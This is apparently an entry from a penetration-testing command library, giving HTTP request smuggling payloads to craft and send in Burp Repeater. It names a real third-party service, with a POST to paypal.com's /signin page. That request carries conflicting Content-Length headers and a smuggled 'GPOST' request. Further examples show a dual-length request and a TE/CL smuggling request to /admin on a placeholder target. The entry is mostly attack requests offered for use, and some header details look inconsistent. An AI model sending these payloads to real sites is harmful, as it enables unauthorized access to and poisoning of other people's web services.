---
data: >-
  In Burp Repeater: POST /signin HTTP/1.1\nHost: paypal.com\nContent-Length:
  0\nContent-Length: 5\n\nGPOST / HTTP/1.1
tags:
  - http-manipulation
  - web-testing
type: command
executor: burp
platforms:
  - Web
id: b257e241-3725-443c-adbb-6a8997e26a7e
created_at: '2025-12-11T06:10:40.607Z'
updated_at: '2025-12-11T06:10:40.607Z'
verified: false
validated: true
submitted: true
---
# burp-request-manipulation

## Command

```bash
# In Burp Repeater: Craft and send
POST /signin HTTP/1.1
Host: paypal.com
Content-Length: 0
Content-Length: 5

GPOST / HTTP/1.1
```

## Description

This Burp Suite action manipulates HTTP requests to test for vulnerabilities like request smuggling by editing headers and body in the Repeater tool.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `Content-Length: 0` | Initial length for desync | Yes |
| `Content-Length: 5` | Conflicting length | Yes |
| `GPOST / HTTP/1.1` | Smuggled request | Yes |

## Examples

### Basic Usage

```bash
# Burp: POST with dual CL
POST / HTTP/1.1
Host: target.com
Content-Length: 0
Content-Length: 4

test
```

### Advanced Usage

```bash
# Burp: TE/CL smuggling
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
```

## Expected Output

Response indicating smuggling success, like backend processing the smuggled part.

## Related

- [[commands/curl-http-smuggling-test]]
- [[procedures/Inject-Malicious-Content-via-Smuggled-Request]]
